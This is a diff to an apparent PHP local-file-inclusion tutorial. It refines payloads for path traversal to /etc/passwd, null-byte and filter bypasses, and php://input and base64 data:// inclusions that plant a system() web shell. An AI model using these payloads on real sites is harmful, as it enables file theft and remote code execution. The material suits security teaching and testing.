@@ -22,16 +22,18 @@ Against `include($_GET['page'])`, climb out of the expected directory to reach a
 ?page=../../../../etc/passwd
 ```
 
-When the code appends an extension, for example `include($_GET['page'].'.php')`, defeat it where the stack allows. Path truncation and a null byte are the classic answers on legacy PHP:
+When the code appends an extension, for example `include($_GET['page'].'.php')`, a null byte truncates the string before the suffix so the include resolves to `/etc/passwd` instead of `/etc/passwd.php`. This was fixed in PHP 5.3.4, so it only works on older builds:
 
 ```
 ?page=../../../../etc/passwd%00
+```
+
+A very long trailing `/./././...` (path truncation, overflowing PHP's ~4096-byte path buffer) likewise dropped the appended suffix on legacy PHP. On modern PHP neither trick defeats an appended extension, so a wrapper or log-poisoning route is needed instead.
+
+Separately, if a filter strips literal `../`, bypass the filter with non-recursively-stripped sequences and encoded separators. These defeat the *filter*, not an appended extension:
+
+```
 ?page=....//....//etc/passwd
-```
-
-URL- and double-encode the separators if a filter strips literal `../`:
-
-```
 ?page=..%2f..%2f..%2fetc%2fpasswd
 ?page=%252e%252e%252fetc%252fpasswd
 ```
@@ -56,7 +58,7 @@ POST /?page=php://input HTTP/1.1
 <?php system($_GET['c']); ?>
 ```
 
-**Code execution with `data://`.** Inline the payload, optionally base64:
+**Code execution with `data://`.** When `allow_url_include` is on, inline the payload, optionally base64:
 
 ```
 ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
